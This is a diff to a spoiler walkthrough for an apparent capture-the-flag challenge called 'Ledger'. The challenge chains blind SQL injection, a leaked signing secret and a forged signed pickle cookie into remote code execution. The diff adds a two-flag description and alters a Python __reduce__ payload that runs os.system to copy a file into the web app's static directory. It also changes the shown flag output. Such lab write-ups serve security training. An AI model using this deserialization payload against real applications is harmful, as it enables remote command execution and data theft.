@@ -1,6 +1,8 @@
 # Walkthrough — Ledger  (SPOILERS)
 
 **Chain:** blind boolean SQL injection → exfiltrate signing secret → forge signed pickle →
+
+> Two flags — **FLAG1 (access):** stored in the DB, exfiltrated with the blind-SQLi oracle. **FLAG2 (proof):** forge a signed pickle for RCE (`/proof.txt`).
 insecure deserialization → RCE → flag.
 
 ## 1. Blind SQL injection
@@ -34,12 +36,12 @@ A class whose `__reduce__` returns `(os.system, (cmd,))` runs `cmd` during `pick
 ```python
 class RCE:
     def __reduce__(self):
-        return (os.system, ("cat /flag.txt > /app/static/leak.txt",))
+        return (os.system, ("cat /proof.txt > /app/static/leak.txt",))
 ```
 Base64 the pickle, HMAC-sign with the leaked secret, send as the `prefs` cookie, request `/`. The
 command writes the flag into Flask's static dir; fetch `/static/leak.txt`:
 ```
-→ FLAG{bl1nd_sqli_leaked_the_pickle_key}
+→ FLAG2{pickle_deserialization_rce}
 ```
 
 ## Fixes
